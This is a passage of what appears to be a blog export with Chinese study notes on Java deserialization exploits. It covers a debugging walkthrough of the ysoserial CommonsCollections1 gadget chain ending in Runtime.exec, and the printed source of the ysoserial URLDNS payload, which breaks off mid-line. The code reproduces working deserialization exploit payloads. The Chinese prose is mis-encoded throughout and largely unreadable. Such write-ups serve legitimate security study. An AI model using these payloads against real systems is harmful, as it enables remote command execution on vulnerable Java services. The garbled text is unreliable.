class="keyword">new</span> Class[] &#123; </span><br><span class="line">            String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">            <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="comment">// ä¼ å…¥ä¸Šé¢transformå¾—åˆ°çš„getRuntimeæ–¹æ³•ï¼ˆMethodå¯¹è±¡ï¼‰ï¼Œè°ƒç”¨invokeæ–¹æ³•ï¼Œä¼ å…¥invokeæ–¹æ³•çš„å‚æ•°ä¸ºObject[]ï¼Œå…¶å®å°±æ˜¯æŒ‰ç…§å‚æ•°åˆ—è¡¨ä¼ å°±å¥½äº†ï¼Œå› ä¸ºæ­¤å¤„åªéœ€è¦è°ƒç”¨invokeæ–¹æ³•è·å¾—Runtimeå¯¹è±¡</span></span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">            Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">            <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="comment">// ä¼ å…¥ä¸Šé¢transformå¾—åˆ°çš„Runtimeå¯¹è±¡ï¼Œè°ƒç”¨execæ–¹æ³•ï¼Œä¼ å…¥è¯¥æ–¹æ³•çš„å‚æ•°ä¸ºexecArgs</span></span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br></pre></td></tr></table></figure><h4 id="æœ€ååº·åº·proxy"><a class="markdownIt-Anchor" href="#æœ€ååº·åº·proxy">#</a> æœ€ååº·åº· proxy</h4><p>ä¸ºä»€ä¹ˆä¼šåˆ©ç”¨åˆ°å¯¹è±¡ä»£ç†å‘¢ï¼Ÿ</p><p>å½“ç„¶æ˜¯å› ä¸ºä»£ç†çš„ä¸€äº›äº›ç‰¹æ€§è¾£</p><p>æ¯ä¸ªä»£ç†ç±»æœ‰ä¸€ä¸ªå…¬å…±æ„é€ ä¸€ä¸ªå‚æ•°ï¼Œè¯¥æ¥å£çš„å®ç° <code>InvocationHandler</code>  ï¼Œè®¾ç½®è°ƒç”¨å¤„ç†ç¨‹åºçš„ä»£ç†å®ä¾‹</p><p>åº·åº·æ„é€ æ–¹æ³•ï¼Œä¼šä¼ å…¥ä¸€ä¸ª InvocationHandler å¯¹è±¡</p><p>å¹¶ä¸”åœ¨è°ƒç”¨è¯¥ä»£ç†å¯¹è±¡ä»»æ„æ–¹æ³•æ—¶ï¼Œä¼šè°ƒç”¨ InvocationHandler#invoke ()</p><p><img src="63.png" alt=""></p><p>ä½†æ˜¯è¯¥æ–¹æ³•æ˜¯ protected çš„ï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªä»£ç†å¯¹è±¡æ—¶éœ€è¦æ‰¾åˆ°å¦ä¸€ä¸ªå¯ä»¥è¿”å›å®ä¾‹çš„æ–¹æ³•</p><p>é‚£å°±æ˜¯ newProxyInstance æ–¹æ³•å•¦</p><p><img src="64.png" alt=""></p><p>æ¥æµ‹è¯•è¯•è¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * My Test Class</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TestInvocationHandler handler = <span class="keyword">new</span> TestInvocationHandler();</span><br><span class="line">        Map testProxy = (Map) Proxy.newProxyInstance(Gadgets.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, handler);</span><br><span class="line">        testProxy.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method: &quot;</span> + method.toString());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>debug ä»£ç ï¼Œå¯ä»¥çœ‹è§å½“è°ƒç”¨ Map#put æ—¶ï¼Œä¼šè¿›å…¥ TestInvocationHandler#invoke</p><p><img src="65.png" alt=""></p><p>æ²¡æˆ³ proxy åˆ©ç”¨åˆ°çš„ç‚¹å°±è¿™ä¸€ä¸ªå•¦</p><h3 id="è°ƒè¯•"><a class="markdownIt-Anchor" href="#è°ƒè¯•">#</a> è°ƒè¯•</h3><p>æ¯”è¾ƒç»•çš„åœ°æ–¹è°ƒè¯•ä¸€æ³¢</p><p><img src="36.png" alt=""></p><p>è¿›å…¥è¯¥å‡½æ•°ï¼Œå‘ç°æœ‰ä¸¤å¤„å‡½æ•°è®¡ç®—</p><p><img src="37.png" alt=""></p><p>è¿›å…¥ <code>createMemoizedInvocationHandler(map)</code></p><p>å…¶ä¸­ <code>ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</code></p><p>å¯ä»¥çœ‹å‡ºæ­¤å¤„æ˜¯é€šè¿‡åå°„è·å– AnnotationInvocationHandler å¯¹è±¡ï¼Œä¸”è·å–å¯¹è±¡æ—¶ä¼ å…¥äº†æ„é€ çš„ LazyMap</p><p><img src="38.png" alt=""></p><p>è¿›å…¥ <code>createProxy(handler,iface,ifaces)</code></p><p>å¯¹ä¼ å…¥çš„ iface è¿›è¡Œä»£ç†ï¼Œå¹¶ä¼ å…¥ä¸Šä¸€æ­¥è·å¾—çš„ AnnotationInvocationHandler å¯¹è±¡ handler2</p><p>iface ä¸ºä¼ å…¥çš„ Map.class (CommonsCollections1.java ä¸­ï¼š <code>mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</code> ï¼‰</p><p><img src="39.png" alt=""></p><p>ä¸¤æ¬¡å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œè¿”å› CommonsCollections1</p><p>è¿”å›ä»£ç†å¯¹è±¡ mapProxyï¼ˆè°ƒç”¨è¯¥å¯¹è±¡ä»»æ„æ–¹æ³•ï¼Œéƒ½ä¼šå…ˆè°ƒç”¨ä¼ å…¥çš„ handler#invokeï¼‰</p><p>73 è¡Œä»£ç å°†è·å–åˆ°çš„ mapProxy è¿›è¡ŒåŒ…è£¹æ˜¯å› ä¸ºï¼š</p><p>â€‹ç”±äºååºåˆ—åŒ–å…¥å£ä¸º readObjectï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŸä¸ªç±»çš„ readObject ä¸­ä¼šè°ƒç”¨ä¼ å…¥ map çš„ä»»æ„æ–¹æ³•</p><p>â€‹AnnotationInvocationHandler#readObject ä¸­æœ‰è°ƒç”¨ map.entrySet ()</p><p>â€‹ä»è€Œè§¦å‘ AnnotationInvocationHandler#invoke</p><p><img src="40.png" alt=""></p><p>æœ€åè¿”å›å±‚å±‚æ„é€ å¥½çš„ï¼Œè¿˜æ²¡æœ‰åºåˆ—åŒ–çš„ï¼Œpayload å•¦</p><h2 id="payloadè§¦å‘åˆ†æ"><a class="markdownIt-Anchor" href="#payloadè§¦å‘åˆ†æ">#</a> payload è§¦å‘åˆ†æ</h2><p>ä»¥ä¸‹æ˜¯ POC ä¸­ç»™å‡ºçš„è§¦å‘é“¾ï¼Œå¯ä»¥æ ¹æ® Gadget ä¸‹æ–­ç‚¹ï¼ˆè¿™æ ·æ¯”è¾ƒæ¸…æ™°æ„Ÿè§‰ï¼‰</p><p>æ ¹æ®ä¸Šé¢ payload æ„é€ çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å¯ä»¥æ›´å¥½çš„ç†è§£è¯¥åˆ©ç”¨é“¾çš„è§¦å‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">LazyMap.get()</span></span><br><span class="line"><span class="comment">ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Class.getMethod()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Requires:</span></span><br><span class="line"><span class="comment">commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆä» PayloadRunner38 è¡Œè¿›å…¥ååºåˆ—åŒ–</p><p>å…¶ä¸­ serialized æ˜¯æˆ‘ä»¬åºåˆ—åŒ–åçš„ payload</p><p><img src="41.png" alt=""></p><p>è¿›å…¥ ObjectInputStream#readObject</p><p><img src="42.png" alt=""></p><p>åœ¨ AnnotationInvocationHandler#readObject å¤„ä¸‹æ–­ç‚¹ï¼ŒæŸ¥çœ‹è°ƒç”¨æ ˆ</p><p>è§‚å¯Ÿåˆ°åœ¨ ObjectInputStream ä¸­é€šè¿‡åå°„è°ƒç”¨äº† AnnotationInvocationHandler#readObject</p><p><img src="43.png" alt=""></p><p>è¿›å…¥ AnnotationInvocationHandler#readObject</p><p>æ­¤å¤„ memberValues ä¸ºæˆ‘ä»¬ä¼ å…¥çš„ä»£ç†å¯¹è±¡ proxyMap</p><p><img src="45.png" alt=""></p><p>è°ƒç”¨å…¶ä»»æ„æ–¹æ³•ï¼Œå°±ä¼šè¿›å…¥ AnnotationInvocationHandler#invoke</p><p>è¿™é‡Œè¦è¿›å…¥å‡½æ•°ä¸€ç›´ç‚¹ç‚¹ç‚¹ï¼Œå…¶ä¸­ä¼šå¤šæ¬¡è¿”å›è¯¥è¡Œ</p><p><img src="46.png" alt=""></p><p>ç›´åˆ°å†æ¬¡è¿›å…¥ AnnotationInvocationHandler#readObjectï¼Œè¿è¡Œè‡³ 355 è¡Œè¿›å…¥å‡½æ•°ï¼Œä¼šè·³è½¬è‡³ AnnotationInvocationHandler#invoke</p><p><img src="47.png" alt=""></p><p>æŸ¥çœ‹å½“å‰å‡½æ•°è°ƒç”¨æ ˆ</p><p>handler1 çš„ readObject -&gt; ä»£ç†å¯¹è±¡çš„ entrySet -&gt; handler2 çš„ invoke</p><p><img src="48.png" alt=""></p><p>æ„é€  handler2 æ—¶ï¼Œä¼ å…¥çš„ Map å¯¹è±¡å°±æ˜¯æˆ‘ä»¬æ„é€ å¥½çš„ LazyMap</p><p>æ­¤æ—¶åªè¦æœ‰è°ƒç”¨ LazyMap#getï¼Œå°±ä¼šæ‰§è¡Œ transform</p><p>æŸ¥çœ‹å½“å‰å˜é‡ï¼Œthis.memberValues å°±æ˜¯ LazyMap å¯¹è±¡</p><p><img src="49.png" alt=""></p><p>å¾€ä¸‹æ»‘æ»‘æ»‘æ»‘æ»‘</p><p>åœ¨ 78 è¡Œæ‰¾åˆ° <code>this.memberValues.get(var4)</code>  å•¦</p><p><img src="50.png" alt=""></p><p>è°ƒè¯•è¿›å…¥ LazyMap#getï¼Œå…¶ä¸­å½“è·å–çš„ key ä¸å­˜åœ¨æ—¶ï¼Œä¼šè¿›å…¥ if ä»£ç å—è°ƒç”¨æˆ‘ä»¬æ„é€ å¥½çš„ transform</p><p><img src="51.png" alt=""></p><p>æŸ¥çœ‹å˜é‡ï¼Œæ‰§è¡Œçš„ transform å°±æ˜¯æˆ‘ä»¬æ„é€ å¥½çš„ï¼Œä¼šé€šè¿‡åå°„è·å–å‡½æ•°æ‰§è¡Œå‘½ä»¤</p><p><img src="53.png" alt=""></p><p>æŸ¥çœ‹å‡½æ•°è°ƒç”¨æ ˆï¼Œå’Œåˆ†æä¸­ç›¸åŒ</p><p><img src="52.png" alt=""></p><p>è°ƒåˆ°è¿™é‡Œå°±å®Œæˆè§¦å‘å•¦:happy:</p><p>â­ç¢°è§äº†å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜ï¼Œæ¯”å¦‚æ ¹æœ¬ä¸ä¼šè·³è¿› LazyMap#get ä¸­ if ä¸­çš„ä»£ç å—ï¼Œæˆ–è€…è¿˜æ²¡åˆ°è¿™å°±å·²ç»å¼¹çª—äº†ï¼Œæˆ–è€…ç»†è°ƒæ—¶æ ¹æœ¬ä¸ä¼šå¼¹çª—â€¦ å›°æ‰°äº†æˆ‘å¾ˆä¹…ğŸ˜ª</p><p>ä½†æ˜¯æ­£å¸¸è¿è¡Œæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œæ‰€ä»¥æˆ‘å–æ¶ˆäº†æ‰€æœ‰é™¤æ­¤ä¹‹å¤–çš„æ–­ç‚¹ï¼ŒæŸ¥çœ‹å‡½æ•°è°ƒç”¨æ ˆå’Œå˜é‡éƒ½ OK äº†</p><p>æ‰€ä»¥æ„Ÿè§‰åº”è¯¥æ˜¯ debug åœ¨å®ç°è‡ªèº«åŠŸèƒ½æ—¶æœ‰å½±å“åˆ°æ­£å¸¸ä»£ç çš„è§¦å‘ï¼Œè¿™é‡Œè¯´æ˜ä¸€ä¸‹å•¦</p><h1 id="å“”å“”å“”å£æ°´æ€»ç»“"><a class="markdownIt-Anchor" href="#å“”å“”å“”å£æ°´æ€»ç»“">#</a> å“”å“”å“”å£æ°´æ€»ç»“</h1><p>çœ‹ p ç¥çš„æ–‡ç« ï¼Œä¸€ç‚¹ä¸€ç‚¹ä»”ç»†çœ‹äº†ä¸€é</p><p><img src="54.png" alt=""></p><p>ç„¶åè„‘è¢‹ç“œå­å°±ç³Šäº†</p><p><img src="55.jpg" alt=""></p><p>ç„¶åå°±ä» URLDNS å¼€å§‹å†çœ‹ä¸€é</p><p>ç„¶åå‘ç°å“‡å¡</p><p>URLDNS çœŸçš„å¥½ç®€å•è€¶</p><p>æ€ä¹ˆä¼šæœ‰äººçœ‹ä¸æ‡‚è¿™ä¹ˆç®€å•çš„åŸç†å‘€ä¸ä¼šæŠŠä¸ä¼šå§</p><p><img src="57.jpg" alt=""></p><p>ç„¶åçœ‹ cc1ï¼ŒæŠŠ payload åŸç†åˆçœ‹äº†ä¸€éï¼Œä»€ä¹ˆ transform ä¹Ÿå¤ªç®€å•äº†æŠŠï¼Œä¸å°±æ˜¯è¿™æ ·å—ï¼Œè¿™æœ‰ä»€ä¹ˆéš¾åº¦å—ï¼Ÿï¼Ÿï¼Ÿ</p><p><img src="58.jpg" alt=""></p><p>ç„¶åçœ‹è§¦å‘åŸç†è°ƒè¯•çš„æ—¶å€™å°±æ˜¯è¿™æ ·äº† (beiwei)</p><p><img src="59.png" alt=""></p><p>ç”±å…¶æ˜¯è¿˜ç¢°è§äº†è°ƒè¯•ä¸Šçš„é—®é¢˜</p><p>å·¦å·¦å³å³è°ƒè¯•äº†ä¸€ä¸¤ä¸ªæ˜ŸæœŸæŠŠ</p><p><img src="60.jpeg" alt=""></p><p>ä¸€ç›´æƒ³æŠŠæ•´ä¸ªè¿‡ç¨‹ç®€æ´ä¼˜é›…çš„æ€»ç»“å‡ºæ¥ï¼Œæ‰€ä»¥ä¸æ–­åœ°æ€»ç»“æ€»ç»“ï¼Œç”»å›¾è®°ç¬”è®°â€¦</p><p>å› ä¸ºèƒ½ç®€å•çš„æŠŠé—®é¢˜è§£é‡Šæ¸…æ¥šæ‰èƒ½è¯æ˜è‡ªå·±æ˜¯çœŸçš„ç†è§£äº†ï¼ˆä¸ç„¶å°±å’Œç¬¬ä¸€éçœ‹ p å¤§æ–‡ç« çš„æƒ…å†µä¸€æ ·äº†ï¼‰</p><p>ç„¶åè°ƒå®Œäº†ç†è§£äº†æ€»ç»“äº†è®°ç¬”è®°äº†ï¼Œæˆ‘åˆè¡Œäº†</p><p><img src="58.jpg" alt=""></p><p>è¿™ä¹Ÿå¤ªç®€å•äº†å§</p><p>ä¸ä¼šå§ä¸ä¼šå§ä¼šéš¾é“è¿˜æœ‰äººçœ‹ä¸æ‡‚ cc1 å—</p><p>ä»¥ä¸Šä½œæ­»çš„è¡Œä¸ºåªæ˜¯æƒ³æé†’è‡ªå·±ï¼Œå¾ˆå¤šå¾ˆéš¾çš„çŸ¥è¯†ç‚¹ä¸€å®šè¦è‡ªå·±åŠ¨æ‰‹å»è¯•ï¼Œå¤šæ€»ç»“ï¼Œä¸€å®šè¦å†™æ–‡ç« è®°å½•ä¸‹æ¥ï¼ˆå¹´çºªå¤§äº†çœŸçš„ä¼šå¿˜çš„ï¼‰ï¼Œç»†èŠ‚ä¸è¦æ”¾è¿‡ï¼Œä¸€ç‚¹ä¸€ç‚¹æŠ </p><p>æˆ‘çœŸçš„ä¸æ˜¯å°å¤©æ‰ï¼Œæˆ‘åªæ˜¯ä¸ªå°ç¥ä»™ç½¢äº†ï¼Œå”‰</p><p><img src="61.gif" alt=""></p><p>ä¸‹å›¾æ˜¯åœ¨ç†è§£è§¦å‘åŸç†æ—¶è‡ªå·±å†™çš„ä¸€ä¸ªå¤§æ¦‚çš„æµç¨‹ï¼ˆå°½é‡ç®€æ´ä½†æ˜¯ä¸æ˜¯å¾ˆç®€æ´ï¼‰</p><p>çœ‹ä¸çœ‹å¾—æ‡‚å°±çœ‹ç¼˜åˆ†äº†ğŸ˜´</p><p><img src="60.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ysoserialä¹‹URLDNSè°ƒè¯•</title>
      <link href="/2021/08/25/dmsj/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/"/>
      <url>/2021/08/25/dmsj/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="åˆ©ç”¨é“¾ç®€è¿°"><a class="markdownIt-Anchor" href="#åˆ©ç”¨é“¾ç®€è¿°">#</a> åˆ©ç”¨é“¾ç®€è¿°</h1><ol><li>è§¦å‘ç»“æœä¸ºä¸€æ¬¡ DNS è¯·æ±‚ï¼Œé€‚ç”¨ç›®æ ‡æ— å›æ˜¾æƒ…å†µ</li><li>ä½¿ç”¨ java å†…ç½®ç±»æ„é€ ï¼Œæ— ç¬¬ä¸‰æ–¹åº“ä¾èµ–</li></ol><h1 id="urldnsåˆ©ç”¨ä»£ç "><a class="markdownIt-Anchor" href="#urldnsåˆ©ç”¨ä»£ç ">#</a> URLDNS åˆ©ç”¨ä»£ç </h1><p>pocï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span 